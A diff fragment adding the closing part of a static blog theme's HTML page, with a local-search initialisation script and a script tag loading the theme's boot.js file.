+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
